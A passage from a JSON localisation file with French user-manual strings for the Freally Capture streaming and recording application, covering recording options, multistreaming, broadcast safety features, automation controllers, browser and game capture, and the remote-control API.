<strong>ffmpeg</strong>, qui n'est <em>pas intégré</em> : Freally Capture le télécharge la première fois que vous en avez besoin et le vérifie. Le format sans perte <strong>freally-video</strong> ne nécessite aucun téléchargement.","manual.691bff5377a8":"Enregistrement et replay en profondeur","manual.3c2d08430816":"Tout ce qui entoure le fichier : des enregistrements séparés de chaque source, un découpeur de clips, une vraie transparence, le découpage et des marqueurs sur événements, des tâches après l'enregistrement, une vérification d'intégrité et le timecode SMPTE. Tout est désactivé tant que vous ne l'activez pas, et rien ne passe par Internet.","manual.537ffa2b9063":"Enregistrement ISO par source","manual.e57aa725fa41":"Ouvrez <strong>Paramètres → Sortie</strong> et repérez <strong>Enregistrement ISO</strong>. Activez <strong>Enregistrer « {name} » dans son propre fichier ISO</strong> pour chaque source que vous voulez propre : chacune est enregistrée avant la composition, à la taille et à la fréquence d'images du canevas, si bien que chaque fichier s'aligne sur le programme dans une timeline de montage. Chaque invité à distance est une source : chaque invité obtient donc lui aussi un fichier.","manual.4bce8f25ec9c":"Laissez <strong>Enregistrer avec les filtres de la source</strong> coché pour obtenir le rendu traité, ou décochez-le pour la source brute, et choisissez pour chaque enregistrement le <strong>Format ISO</strong> et l'<strong>Encodeur vidéo ISO</strong>. L'audio est prélevé après les filtres mais avant le fader et la coupure, si bien qu'un choix de mixage ne rend jamais un fichier ISO muet.","manual.7f29ae4e2c55":"<strong>Astuce :</strong> deux enregistrements ISO passent sans difficulté sur une carte graphique de milieu de gamme ; chaque enregistrement supplémentaire coûte un rendu et un encodage de plus, et le panneau l'indique.","manual.b2aad668b8b9":"Le découpeur de replays et de clips","manual.c8af16e1cd4f":"Depuis la liste des enregistrements, ouvrez un enregistrement sauvegardé dans la fenêtre <strong>Rogner</strong>, parcourez-le avec <strong>Reculer d'une image</strong> et <strong>Avancer d'une image</strong>, et placez vos points avec <strong>Point d'entrée</strong> et <strong>Point de sortie</strong> pendant la lecture.","manual.1f80dfd03a36":"Vérifiez le badge avant d'exporter. Un badge vert <em>« Export sans réencodage »</em> signifie que le point d'entrée tombe sur une image clé (export quasi instantané et sans perte) ; le badge orange prévient qu'il y aura un réencodage — appuyez sur <strong>Image clé</strong> pour caler le point d'entrée et obtenir une coupe sans perte. Cliquez sur <strong>Exporter l'extrait</strong>, ou sur <strong>9:16</strong> pour exporter une version verticale.","manual.8a92b0b480f4":"Enregistrer avec transparence","manual.79bfd450e6aa":"Dans <strong>Paramètres → Sortie</strong>, activez <strong>Enregistrer avec transparence (alpha)</strong> pour enregistrer le programme sur un fond transparent au format <code>.frec</code> de Capture. L'enregistrement dispose de son propre rendu transparent, si bien que votre aperçu et votre stream conservent l'image normale. Depuis la liste des enregistrements, exportez un <code>.mov</code> <strong>ProRes 4444</strong> ou <strong>QuickTime Animation (QTRLE)</strong> pour votre logiciel de montage ; le MP4 et le MKV aplatissent la transparence.","manual.fade0a9d0454":"<strong>Remarque :</strong> la transparence n'est qu'un indicateur dans l'en-tête <code>.frec</code> : ces fichiers se lisent donc partout où le <code>.frec</code> se lit, et les fichiers plus anciens s'ouvrent comme opaques.","manual.33e5c9a96c5d":"Découpage et marqueurs automatiques","manual.5596d47693a3":"Dans les réglages de découpage pour le <code>.frec</code>, choisissez de commencer un nouveau fichier lors d'un <strong>changement de scène</strong>, d'un <strong>marqueur</strong> ou d'une <strong>étape du conducteur</strong>. Chaque partie commence à l'image exacte de cet événement, et une partie dure au moins une seconde, si bien qu'une rafale d'événements ne peut pas produire une pile de minuscules fichiers.","manual.7fc20a49c196":"Activez <strong>Placer automatiquement des marqueurs de chapitre lors des événements du studio</strong> pour marquer comme chapitres les changements de scène, les replays sauvegardés, les reconnexions, les rafales d'images perdues, les alarmes et les actions des règles. Ils vont dans les titres de chapitre MKV et dans le fichier <code>.chapters.txt</code> à côté de l'enregistrement, avec les marqueurs que vous placez à l'aide de votre raccourci.","manual.519fceb746f3":"Après l'enregistrement : la chaîne de traitement et la vérification d'intégrité","manual.561bb55d7a18":"Construisez une <strong>Chaîne post-enregistrement</strong> pour chaque profil à partir d'un ensemble fixe d'étapes — <strong>Vérifier</strong>, <strong>Remux vers MP4</strong>, <strong>Normaliser le niveau sonore</strong>, <strong>Renommer</strong>, <strong>Déplacer vers un dossier</strong>, <strong>Copier vers un dossier</strong>, <strong>Afficher dans le gestionnaire de fichiers</strong> et <strong>Notifier les scripts Lua</strong>. Elle s'exécute en arrière-plan avec une file d'attente en direct et s'arrête au premier échec. Il n'existe volontairement aucune étape « exécuter n'importe quelle commande ».","manual.2f93cddd1f21":"Lancez la vérification d'intégrité après un enregistrement ou quand vous le souhaitez, pour obtenir un simple OK, avertissement ou échec sur le <strong>Conteneur</strong>, la <strong>Continuité vidéo</strong>, la <strong>Continuité audio</strong>, l'<strong>entrelacement audio et vidéo</strong> et la <strong>Durée</strong>. Les fichiers <code>.frec</code> ont droit à la vérification approfondie ; les autres fichiers à une vérification de structure et de décodage via ffmpeg.","manual.0d291aee5546":"Exporter une copie partageable à l'arrêt","manual.124d2a00ed27":"Dans <strong>Paramètres → Sortie</strong>, avec le conteneur réglé sur <code>.frec</code>, cochez <strong>Enregistrer aussi un MP4 partageable à côté du master</strong>. À la fin d'un enregistrement, un export en arrière-plan écrit, à côté du master sans perte, un <code>.mp4</code> que tout le monde peut lire.","manual.a37303723389":"La copie apparaît dans la file post-enregistrement, reçoit un nom qui n'écrase jamais rien, et ne touche jamais au master. Elle est désactivée tant que vous ne l'activez pas.","manual.7ed8656eb1ff":"Timecode SMPTE LTC","manual.3d97874c3064":"Ouvrez <strong>Timecode SMPTE (LTC)</strong>, activez <strong>Générer le LTC sur une piste</strong>, et choisissez la piste de la console et la fréquence d'images pour alimenter des enregistreurs et des caméras externes. Réglez <strong>Lire le LTC depuis</strong> sur une entrée audio pour afficher une ligne de timecode sur l'incrustation de statistiques et pour horodater des marqueurs de chapitre LTC. Le timecode audio classique, entièrement hors ligne, précis à une image près à 24, 25 et 30 fps.","manual.a9f690169703":"Passer en direct","manual.8f6df4580812":"Diffusez directement de votre ordinateur vers une plateforme en RTMP ou RTMPS — jamais par un serveur à nous.","manual.dba22b61cdcc":"Ouvrez <strong>Paramètres → Diffusion</strong> et cliquez sur <strong>Ajouter une destination</strong>. Choisissez <strong>Twitch</strong>, <strong>YouTube</strong>, <strong>Kick</strong>, <strong>Facebook</strong>, <strong>Trovo</strong> ou <strong>RTMP personnalisé</strong>.","manual.2192731aac47":"Collez votre <strong>clé de stream</strong> — conservée sur votre ordinateur et affichée masquée — et réglez le débit et l'encodeur pour ce service.","manual.040014e94f16":"Cliquez sur <strong>Passer en direct</strong> dans <strong>Contrôles</strong>. Le voyant <strong>En direct</strong> s'allume, et le dock de statistiques affiche votre débit, les images perdues et l'état du stream.","manual.0cd441959cb4":"Si votre connexion tombe, Freally Capture <strong>se reconnecte tout seul</strong>, et votre enregistrement local continue quoi qu'il arrive au stream. Réglez un <strong>délai de diffusion</strong> si vous en voulez un.","manual.dc8ebcea4893":"Cliquez sur <strong>Terminer le direct</strong> pour arrêter.","manual.973adc03e43c":"Sécurité de la diffusion","manual.53fa9293a65e":"Ne pas perdre l'émission — avant, pendant et après.","manual.de8792b14216":"Avant : la check-list avant le direct","manual.ed9a4b7bfaf5":"Cliquer sur <strong>Passer en direct</strong> lance d'abord une check-list : les destinations ont une clé, un encodeur utilisable est trouvé, chaque source est en bon état et l'espace disque suffit pour l'enregistrement — chaque point en vert ou en rouge, avec une correction en un clic — plus des rappels sur les niveaux du microphone et de l'audio du bureau et sur le tampon de replay, qui ne bloquent jamais une émission uniquement à l'écran. Un réglage peut <strong>bloquer Passer en direct tant que chaque vérification bloquante n'est pas au vert</strong> ; sinon, « Passer en direct quand même » reste disponible.","manual.9b63c5c64ba1":"Pendant : alarmes, état des sources et basculement","manual.9c386b745073":"Les <strong>alarmes de sécurité</strong> veillent pendant que vous êtes en direct ou en train d'enregistrer : audio du programme silencieux, saturation prolongée, image noire ou figée, et une <em>prévision</em> de manque d'espace disque (« environ 22 minutes restantes au débit actuel »). Elles apparaissent sous forme de bandeau que vous pouvez fermer, et les lecteurs d'écran les annoncent — jamais une boîte de dialogue qui interrompt l'émission.","manual.b7c8c66a5330":"Le <strong>tableau de bord de l'état des sources</strong> (palette de commandes → « État des sources… ») liste l'état de chaque source, sa fréquence d'images, l'âge de sa dernière image, les images perdues et les redémarrages, avec <strong>Redémarrer</strong> et <strong>Propriétés</strong> pour chacune.","manual.92bd60ef963b":"Si l'encodeur matériel tombe en panne en plein stream ou en plein enregistrement — une réinitialisation du pilote, une carte graphique trop sollicitée — le <strong>basculement d'encodeur</strong> passe à un autre encodeur matériel ou à x264. Le stream se reconnecte et reste en ligne, l'enregistrement continue dans un nouveau fichier, et un message indique exactement ce qui s'est passé. Les problèmes réseau ne provoquent jamais de basculement.","manual.50a02fe4fe7b":"Le <strong>bouton panique</strong> (un raccourci global de votre choix) bascule le programme — ainsi que le canevas vertical et tous les projecteurs — sur un écran de confidentialité, arrête toutes les captures et coupe tout l'audio, microphone compris, tandis que le stream et l'enregistrement restent connectés. Le retour exige une confirmation délibérée en deux étapes. Réglez la couleur ou l'image de l'écran de confidentialité à côté du raccourci, dans <strong>Paramètres → Raccourcis</strong>.","manual.a73a2857361e":"Après : des enregistrements sûrs et une fermeture en bon ordre","manual.bf07b060e7e7":"Les enregistrements MP4 et MOV sont écrits en <strong>fragments</strong>, si bien qu'un plantage ou une coupure de courant laisse quand même un fichier lisible (c'était déjà le cas du MKV et du <code>.frec</code>). Si une session se termine en plein enregistrement, le lancement suivant propose de <strong>Réparer</strong> en un clic vers une copie <code>(repaired)</code> ; l'original n'est jamais touché.","manual.da5eeb31c1b8":"Quitter pendant un direct, un enregistrement ou avec le replay armé affiche ce qui va se passer, puis arrête tout <strong>dans l'ordre</strong> : terminer le stream, finaliser l'enregistrement, sauvegarder le tampon de replay, enregistrer votre travail.","manual.26b3f2c32e05":"Les <strong>noms des fichiers d'enregistrement</strong> suivent un modèle (<strong>Paramètres → Sortie</strong>) construit à partir de jetons — <code>{prefix}</code> <code>{date}</code> <code>{time}</code> <code>{scene}</code> <code>{profile}</code> <code>{canvas}</code> <code>{marker-count}</code> <code>{counter}</code> — pour les enregistrements, les replays et les images fixes, avec des dossiers dédiés aux replays et aux images fixes.","manual.27c3f23547ac":"<strong>Exporter les diagnostics</strong> enregistre un ensemble de détails techniques dans un fichier sur votre ordinateur, constitué à partir d'une liste d'autorisation stricte pour que les clés de stream, les mots de passe, les chemins et les noms de fichiers n'y figurent jamais. Vous pouvez d'abord lire ce qu'il contient ; il reste là où vous l'enregistrez et n'est jamais envoyé nulle part.","manual.5199babf9b90":"Sources et périphériques","manual.306121fdda68":"Tout ce qui se trouve entre l'objectif et le canevas : signaux de test, calibrage de la synchro, texte depuis un fichier, minuteurs, la carte des raccourcis, la console en profondeur et de vrais réglages des périphériques.","manual.5eacf1ee941f":"Signaux de test et calibrage de la synchro A/V","manual.920b7abd63cc":"Ajoutez une source <strong>Signal de test</strong> (<strong>Sources → + → Signal de test</strong>) : mire de barres de couleur, grille de calibrage, balayage de mouvement, tonalité de référence à 1 kHz à −20 dBFS, ou un <strong>flash et bip</strong> combiné pour la synchronisation audio-vidéo — image et son produits à partir d'une même horloge. Vérifiez un projecteur, un encodeur ou une destination de stream sans aucune caméra branchée.","manual.788073298328":"Ouvrez l'atelier de <strong>calibrage de la synchro A/V</strong> (palette de commandes → « Calibrage de la synchro A/V… »). Choisissez la caméra et le microphone à aligner, pointez la caméra vers le programme qui clignote (la boîte de dialogue peut ouvrir un projecteur plein écran à cet effet), et laissez-le mesurer pendant une douzaine de secondes. Il repère le flash et le bip sur plusieurs cycles et propose d'appliquer le décalage mesuré au microphone ; le curseur manuel reste disponible en solution de repli. La mesure passe par votre écran et vos haut-parleurs, si bien que leurs propres petits délais en font partie — et un échec indique <em>pourquoi</em>.","manual.825c83c405fb":"Minuteurs, horloges et texte depuis un fichier","manual.85622b429b51":"Une source <strong>Minuteur</strong> affiche une horloge (avec votre propre format et un décalage UTC fixe facultatif), un <strong>Compte à rebours</strong> (pour une durée donnée, ou jusqu'à la prochaine heure de la journée — à zéro, il peut clignoter ou changer de scène), un <strong>Chronomètre</strong>, ou le <strong>temps écoulé depuis le passage en direct ou le début de l'enregistrement</strong>. Démarrez-le, mettez-le en pause et réinitialisez-le depuis ses <strong>Propriétés</strong>, ou attribuez les deux raccourcis globaux qui pilotent <em>tous</em> les minuteurs à la fois (<strong>Paramètres → Raccourcis</strong>).","manual.fcd4f802968f":"Une source <strong>Texte</strong> peut <strong>lire un fichier surveillé</strong> (<strong>Propriétés → Lire depuis un fichier</strong>) : un fichier <code>.txt</code> entier, une cellule CSV (par nom ou numéro de colonne) ou une valeur JSON (un pointeur tel que <code>/teams/0/score</code>). Les modifications s'affichent en moins d'une demi-seconde. Des tableaux de score et des bandeaux de titre sans aucun service derrière.","manual.1d106549f0ce":"La carte des raccourcis et la console","manual.5d6ad89f147c":"La <strong>Carte des raccourcis</strong> (palette de commandes → « Carte des raccourcis… ») liste <em>toutes</em> les attributions — les actions globales ainsi que l'appuyer pour parler et l'appuyer pour couper de chaque source —, avec recherche et filtres, et signale honnêtement les conflits : un même raccourci écrit de deux façons est indiqué comme partagé, et une touche refusée par le système (parce qu'une autre application la détient) le dit. <strong>Exporter l'antisèche</strong> écrit une référence Markdown dans votre dossier Téléchargements.","manual.e32e382b9753":"Chaque tranche de la console dispose d'un <strong>Panoramique</strong> (balance stéréo ; le centre équivaut exactement à l'absence de panoramique, et un double-clic le réinitialise), d'un <strong>solo PFL</strong> (le monitoring n'entend que les tranches en solo ; le mix du programme ne change jamais) et d'une réduction en <strong>mono</strong>. Le panoramique et le mono se trouvent dans le menu « ⋯ » de la tranche ; le solo est sur la tranche elle-même.","manual.5dbd70dfc92d":"Périphériques en profondeur : désentrelacement et réglages caméra","manual.f8e60899a881":"Les <strong>Propriétés</strong> d'un périphérique de capture vidéo proposent le <strong>Désentrelacement</strong> pour les flux entrelacés, comme ceux des cartes d'acquisition reliées à d'anciennes caméras et consoles : suppression, bob, linéaire, mélange ou adaptatif au mouvement, avec l'ordre des trames. Il fonctionne de la même façon sur tous les systèmes ; le modifier redémarre le périphérique.","manual.34192e6d30fd":"Les <strong>Réglages caméra</strong> — exposition, balance des blancs, mise au point, zoom, gain et plus encore — apparaissent dans les mêmes <strong>Propriétés</strong> pendant que la caméra fonctionne. Windows et Linux utilisent les réglages UVC standard ; macOS affiche ce que le système signale, c'est-à-dire souvent rien, et le panneau le dit plutôt que d'afficher des curseurs sans effet. Chaque réglage est enregistré dans un <strong>profil propre à cette caméra</strong>, appliqué de nouveau lorsqu'elle est rebranchée ou que l'application redémarre ; <strong>Réinitialiser le profil</strong> rétablit les valeurs par défaut.","manual.f77f10d8c967":"Automatisation et contrôle","manual.726216fb4de1":"Laissez le studio se piloter tout seul avec des règles, des macros et des contrôleurs matériels — chacun limité à une seule liste fixe de commandes du studio, si bien qu'aucune automatisation ne peut désigner un fichier, lancer un programme ou accéder à Internet.","manual.193521bd4921":"Règles, macros et variables","manual.e8ee7ccab125":"Ouvrez <strong>Outils → Règles d'automatisation et macros…</strong> et ajoutez une règle. Choisissez l'un des neuf déclencheurs (un changement de scène, le début ou la fin du stream, le début ou la fin de l'enregistrement, une erreur de source, un niveau audio qui franchit un seuil, le système qui passe en veille, une fenêtre qui prend le focus, une heure de la journée, ou un fichier surveillé qui change), ajoutez des conditions (la valeur d'une variable, en direct, en enregistrement), et choisissez une action du studio. Chaque règle commence <strong>désactivée</strong> : activez-la pour l'armer.","manual.5deaa7ba718f":"Construisez une macro sous forme de liste nommée d'étapes — exécuter une action, attendre, définir une variable — avec un nombre de répétitions et un raccourci global facultatif. Lancez-la depuis l'application, un raccourci, une règle ou l'API de contrôle à distance.","manual.30ee5b1326f2":"Définissez une <strong>variable</strong> du studio dans une macro et utilisez-la sous la forme <code>{{name}}</code> dans n'importe quelle source Texte : le texte change dès que la macro définit la valeur.","manual.5eb10fc04538":"Contrôleurs : MIDI, OSC et le panneau tactile","manual.ba0c838f1688":"Ouvrez <strong>Outils → Contrôle MIDI…</strong> et apprenez-lui un pad, un potentiomètre ou un fader pour une action, une macro, un changement de scène, un fader de la console ou une coupure du son — avec des voyants et des faders motorisés qui suivent l'état réel du studio. Aucun port MIDI ne s'ouvre tant que vous n'en choisissez pas un.","manual.cc993cb0d974":"Activez <strong>Écouter l’OSC</strong> pour permettre aux contrôleurs de type TouchOSC et aux consoles d'éclairage d'envoyer des adresses telles que <code>/scene/switch</code>, <code>/record/start</code>, <code>/macro/run</code> et <code>/mixer/vol</code>. Cette option est désactivée par défaut et n'écoute que sur cet ordinateur, sauf si vous autorisez votre réseau. L'OSC n'a pas de mot de passe propre.","manual.134e5f4269f9":"Ouvrez <strong>Outils → Panneau LAN et tally…</strong> pour servir une page de contrôle — boutons de scène avec tally en direct, faders de la console et touches d'action — à n'importe quel téléphone via un QR code. Chaque requête exige le mot de passe, et le panneau n'écoute que sur cet ordinateur, sauf si vous autorisez votre réseau. La page tally s'affiche en rouge ou en vert plein écran ; ajoutez <code>?scene=NAME</code> pour surveiller une seule scène.","manual.fc4cd96b860d":"Combinaisons de raccourcis et couches","manual.ec4a9a334753":"Dans un champ de raccourci, attribuez un raccourci simple (Ctrl+Shift+M) ou une combinaison en deux temps (Ctrl+K, puis 3) — la seconde touche n'est réservée que pendant que la combinaison est en attente. Attribuez une <strong>Couche</strong> à un raccourci pour qu'il ne fonctionne que lorsque cette couche est active ; les couches restent actives jusqu'à ce que vous en changiez.","manual.70ad05980925":"Caméras et conducteur de l'émission","manual.24b33b058b99":"Ouvrez <strong>Outils → Caméras PTZ…</strong>, ajoutez une caméra par son adresse VISCA sur IP, enregistrez des préréglages nommés de panoramique, d'inclinaison et de zoom, et associez un préréglage à une scène pour que le passage à cette scène rappelle le cadrage. Le PTZ reste sur votre réseau, et une caméra n'existe que parce que vous avez saisi son adresse : rien n'est recherché.","manual.c9d86b995c5a":"Ouvrez <strong>Outils → Afficher le conducteur…</strong> et listez les étapes — une scène, sa durée de maintien et des actions facultatives — en avançant manuellement ou automatiquement, avec un « à suivre » en direct et le temps restant. Un conducteur change de scène de la manière ordinaire, annulable, et ne modifie jamais votre collection de scènes.","manual.5c94bed2d737":"<strong>Remarque :</strong> chaque règle, macro, attribution MIDI ou OSC, bouton du panneau et étape du conducteur passe par la même liste fixe de commandes que l'API de contrôle à distance, si bien qu'aucun contrôleur ne peut faire ce que les boutons de l'application elle-même ne peuvent pas faire. Chaque écoute réseau est désactivée par défaut et reste sur cet ordinateur, sauf si vous autorisez votre réseau, et les réglages OSC et du panneau vous avertissent que le trafic réseau n'est pas chiffré avant que le port ne s'ouvre.","manual.1f3fd1c7ddc9":"Le multistream","manual.dcac0a03a29b":"Diffusez sur plusieurs plateformes à la fois — directement depuis votre ordinateur, sans service de relais intermédiaire.","manual.42d9628818da":"Ajoutez deux destinations de stream ou plus dans <strong>Paramètres → Diffusion</strong> et activez chacune d'elles.","manual.4144fe0d9694":"Donnez à une plateforme ses propres réglages d'encodeur si elle a besoin d'un débit différent.","manual.cb21d6bb96be":"Cliquez sur <strong>Passer en direct</strong> : vous diffusez vers toutes les destinations activées, en même temps. Le dock de statistiques affiche l'état et le débit de chaque destination, et la défaillance de l'une n'entraîne jamais les autres.","manual.aba9a5f55973":"Vous pouvez aussi enregistrer en même temps une copie locale à pistes séparées, et sauvegarder des replays avec le raccourci de replay pendant la diffusion.","manual.af9343c245a7":"<strong>Gratuit aujourd'hui :</strong> chaque fonctionnalité — multistream, SRT et WHIP, chaque filtre, les scripts, le replay, les packs de transitions et l'API de contrôle à distance — est gratuite aujourd'hui, pour tout le monde. Les versions futures pourraient être vendues.","manual.c08320c45003":"Fiabilité et compréhension de la diffusion","manual.532ab322d03c":"Répétez, mesurez et expliquez votre émission. Tout ce qui suit est désactivé ou neutre par défaut, et rien ne passe par Internet.","manual.80390ae1a9d7":"Le simulateur réseau","manual.7e620ced841e":"Dans <strong>Paramètres → Diffusion</strong>, ouvrez le <strong>Simulateur réseau (répétitions)</strong> et choisissez un <strong>Profil</strong> — <strong>Wi-Fi d'hôtel</strong>, <strong>Partage de connexion</strong>, ou <strong>Personnalisé</strong> avec vos propres valeurs de <strong>Bande passante</strong>, de <strong>Latence</strong>, de <strong>Gigue</strong> et des moments de <strong>Coupure</strong> programmés. Il n'affecte que la sortie locale d'une répétition, ce qui vous permet de vous entraîner aux reconnexions, au multistream et aux choix de débit ; il ne peut jamais ralentir une vraie diffusion.","manual.b22d8c51e0bd":"Le mode répétition","manual.083772633b86":"Appuyez sur le bouton violet <strong>Répéter</strong> pour faire tourner toute la chaîne — compositeur, encodeur, multiplexeur et la vraie logique de reconnexion — vers une destination locale de substitution, <strong>sans que rien ne quitte l'ordinateur</strong>. Un badge <strong>RÉPÉTITION</strong> signale chaque contrôle du direct, et vos clés de stream ne sont même jamais lues : vous pouvez donc répéter avant de les avoir. Vous pouvez aussi enregistrer la répétition.","manual.184d64047c4c":"<strong>Astuce :</strong> associez une répétition au simulateur réseau pour vous entraîner à vous reconnecter sur une connexion faible et instable bien avant le jour J.","manual.d2381a584d24":"La chronologie des images perdues","manual.a6a72c5410a8":"La <strong>Chronologie de la session</strong> enregistre toute la session — temps de rendu, file d'attente de l'encodeur, débit et images perdues de chaque destination, reconnexions, changements de scène, marqueurs et alarmes — sur un seul graphique zoomable. Là où le dock de statistiques montre <em>l'instant présent</em>, la chronologie répond après coup à « que s'est-il passé à la 43e minute ? ».","manual.6e9fee1e85fa":"Le rapport de session et le benchmark d'encodeurs","manual.9dd812cbf648":"Activez <strong>Écrire un rapport de session (HTML + Markdown) à côté de l'enregistrement</strong> dans <strong>Paramètres → Diffusion</strong> pour obtenir un résumé local à la fin de la session : durée en ligne, débit moyen et maximal par destination, temps passé hors ligne, reconnexions, marqueurs, alarmes et emplacement de l'enregistrement. Il reste sur votre ordinateur et est désactivé par défaut.","manual.a9e574b7bd8d":"Utilisez <strong>Lancer le benchmark d'encodeurs…</strong> pour mesurer de courts encodages avec chaque encodeur, préréglage et résolution dont dispose votre ordinateur — environ une minute, entièrement hors ligne — puis <strong>Appliquer aux réglages d'enregistrement</strong> à partir du résultat. Les échecs sont listés, pas masqués, et le benchmark refuse de se lancer pendant que vous êtes en direct ou en train d'enregistrer.","manual.fae310275ed2":"Des sources uniquement sur le stream, ou uniquement dans l'enregistrement","manual.191da176dd0d":"Sur la ligne d'une source, utilisez <strong>Afficher sur le stream</strong> / <strong>Masquer sur le stream</strong> et <strong>Afficher dans l'enregistrement</strong> / <strong>Masquer dans l'enregistrement</strong> pour garder les alertes et le chat sur le stream en direct tandis que l'enregistrement reste propre, à partir d'un seul canevas. Le bouton principal en forme d'œil contrôle toujours l'ensemble, et l'aperçu, les projecteurs et la multivue affichent toujours le programme complet.","manual.46bad2cb618f":"Caméra virtuelle","manual.69ebe5277092":"Utilisez votre programme comme webcam dans n'importe quelle application d'appel vidéo. <strong>Windows uniquement dans 1.2.1.</strong>","manual.ba2b6aa952f7":"Cliquez sur <strong>Démarrer la caméra virtuelle</strong> dans <strong>Contrôles</strong>. Freally Capture ajoute une caméra système appelée <strong>« Freally Capture Virtual Camera »</strong>.","manual.cb3cb4585f19":"Dans Zoom, Meet, Discord ou Teams, choisissez cette caméra dans les réglages vidéo : votre programme devient la webcam.","manual.83db59f4a370":"Cliquez sur <strong>Arrêter la caméra virtuelle</strong> pour la retirer.","manual.91c51d55639b":"<strong>Selon le système :</strong> sous <strong>Windows</strong>, la caméra s'enregistre pour votre utilisateur, sans droits d'administrateur, et est supprimée lorsque vous l'arrêtez. Elle n'est <strong>pas encore signée numériquement</strong> : Windows peut donc afficher un avertissement à son sujet, et une application d'appel vidéo renforcée peut la refuser ; un test complet dans un véritable appel reste à faire. Les caméras pour <strong>macOS</strong> et <strong>Linux</strong> sont des composants distincts qui ne font <em>pas partie de cette version</em>. Freally Capture n'installe jamais de composant système sans vous le demander, sur aucun système.","manual.98839b8e6880":"Source navigateur","manual.3ba821584b20":"Placez une page web en direct — une incrustation d'alertes, un tableau de score, un widget de chat — directement dans une scène.","manual.895f07f428cd":"Dans <strong>Sources</strong>, cliquez sur <strong>+</strong> et choisissez <strong>Navigateur</strong>.","manual.868ee19e975e":"Collez une adresse <strong>http://</strong> ou <strong>https://</strong> et réglez la taille et la fréquence d'images du rendu.","manual.292e94b0a782":"La première fois, Freally Capture propose d'installer le composant <strong>Environnement d'exécution du navigateur</strong>. Il est téléchargé lorsque vous le demandez et vérifié par rapport à son hachage — jamais intégré à l'application — et vous pouvez le supprimer à nouveau depuis <strong>Outils → Composants</strong>.","manual.cd6d7fbd46ee":"<strong>Seuls http et https se chargent.</strong> La règle couvre chaque changement de page, pas seulement l'adresse que vous saisissez : si une page tente de passer à <code>file://</code>, <code>javascript:</code> ou <code>data:</code> — par une redirection, un script, une fenêtre surgissante ou un cadre — le changement est <strong>annulé</strong>, si bien qu'une page ne peut pas lire vos fichiers. Sous Windows, la page s'exécute dans le bac à sable de Chromium. L'environnement d'exécution n'est <strong>pas encore signé numériquement</strong>. Le son de la page n'est pas encore capté : cette version ne gère que l'image.","manual.9c0c8f127dd9":"Capture de jeu","manual.2c08692420b8":"Capturez un jeu en plein écran exclusif que la capture de fenêtre ordinaire ne peut pas voir. <strong>Windows uniquement.</strong>","manual.9d162e3861e9":"Dans <strong>Sources</strong>, cliquez sur <strong>+</strong> et choisissez <strong>Capture de jeu</strong>. <strong>Lisez d'abord l'avertissement</strong> : il explique le risque en termes simples.","manual.4264b41a7732":"Acceptez le risque <em>pour ce seul jeu</em>, puis choisissez le jeu en cours d'exécution dans la liste.","manual.ab3e826e90f1":"Freally Capture charge un petit hook dans ce jeu et récupère ses images à la fréquence d'images propre au jeu.","manual.082fd06e18f9":"<strong>Lisez ceci avant de l'utiliser.</strong> La capture de jeu fonctionne en <strong>chargeant une DLL dans le jeu</strong>. Les logiciels anti-triche et antivirus peuvent considérer cela comme une manipulation, et cela peut entraîner le <strong>bannissement</strong> d'un compte. Rien n'est jamais chargé automatiquement : vous donnez votre accord <strong>pour un seul jeu à la fois</strong>, et cet accord ne peut jamais servir pour un autre jeu — et il ne voyage jamais à l'intérieur d'une collection de scènes partagée. Si un jeu refuse le hook, Freally Capture se replie sur la <strong>Capture de fenêtre</strong> ordinaire avec un message, plutôt que d'échouer. Les jeux HDR et les jeux Direct3D 12 utilisent eux aussi la capture de fenêtre. Sous macOS et Linux, cette source n'est pas proposée.","manual.43fae75af922":"Tampon de replay","manual.40bc664c1c0b":"Gardez les derniers instants en mémoire, pour qu'un raccourci sauvegarde ce qui vient de se passer.","manual.7a69241c10c2":"Cliquez sur <strong>Démarrer le tampon de replay</strong> dans <strong>Contrôles</strong>. Freally Capture conserve les dernières secondes dans un tampon de taille fixe.","manual.684aecea2ba0":"Attribuez un raccourci global <strong>Enregistrer le replay</strong> dans <strong>Paramètres</strong>.","manual.66c44777e965":"Appuyez dessus pour sauvegarder les dernières secondes dans un fichier — sans interrompre votre stream ni votre enregistrement principal. Un message « Replay enregistré » le confirme.","manual.4b598d5daf11":"Prompteur","manual.b7fc474ded62":"Un texte qui défile en douceur pour la personne à l'écran — sur un panneau dans l'application, sur un projecteur plein écran qui peut être inversé en miroir, et sur le panneau tactile en réseau local, tout cela à la fois.","manual.f1c548f77750":"Ouvrez le prompteur depuis <strong>Outils</strong>, saisissez ou collez votre texte, et réglez la vitesse et la police. Réglez le rythme en <strong>caractères par seconde</strong>, ou passez en <strong>BPM</strong> (50 à 250 battements par minute) pour lire des paroles en rythme avec la musique ; chacun de ces changements ajuste le rythme d'un défilement en cours.","manual.3a86eb91938d":"<strong>Pastilles de pause :</strong> tapez <code> -- </code> pour une courte pause ou <code> --N </code> pour un arrêt de N secondes, et cela devient une seule pastille — le curseur la saute, une seule pression sur Delete ou Backspace la supprime, et le copier-coller la conserve entière.","manual.dc7539148aed":"<strong>Démarrer le compte à rebours :</strong> armez un décompte facultatif 3-2-1, affiché à la fois sur l'aperçu de l'opérateur et sur le projecteur, pour que le lecteur ait un temps de préparation avant que le texte ne bouge.","manual.f5113c573ac4":"<strong>Ouvrez le projecteur</strong> pour le lecteur (le mode miroir l'inverse pour une vitre semi-réfléchissante). L'ouvrir ferme la fenêtre de l'opérateur, ce qui vous permet de gérer le stream depuis la fenêtre principale pendant la lecture ; si un compte à rebours est armé, le projecteur revient au début, décompte et lance la lecture. Lecture, pause, arrêt, retour arrière, avance rapide et redémarrage depuis les contrôles à l'écran, un raccourci, le MIDI, l'OSC ou le panneau LAN — tous les contrôles restent synchronisés.","manual.5298a60b0152":"<strong>Lire à voix haute</strong> fait écouter le texte avec la synthèse vocale de votre système : les voix intégrées de Windows, celles de macOS et, sous Linux, <code>spd-say</code> ou <code>espeak-ng</code> lorsqu'ils sont installés. Aucun moteur de synthèse vocale n'est intégré.","manual.5de1b5efa245":"La <strong>saisie semi-automatique</strong> suggère des mots et des expressions en gris clair pendant la frappe ; appuyez sur Tab pour accepter. Chacune des 18 langues a son propre dictionnaire sur votre ordinateur, chargé uniquement pour la langue dans laquelle vous écrivez.","manual.7fb5d22a1670":"Contrôle à distance","manual.b2ba73efdcec":"Pilotez le studio depuis un Stream Deck ou un contrôleur de type Companion — désactivé par défaut, protégé par mot de passe, sur votre propre ordinateur.","manual.6396674fcd28":"Ouvrez <strong>Paramètres → Contrôle à distance</strong>, activez l'<strong>API WebSocket</strong> (désactivée par défaut) et définissez un <strong>Mot de passe</strong>.","manual.56e0d6d295bb":"Elle écoute sur <code>127.0.0.1</code> — cet ordinateur uniquement — sauf si vous autorisez 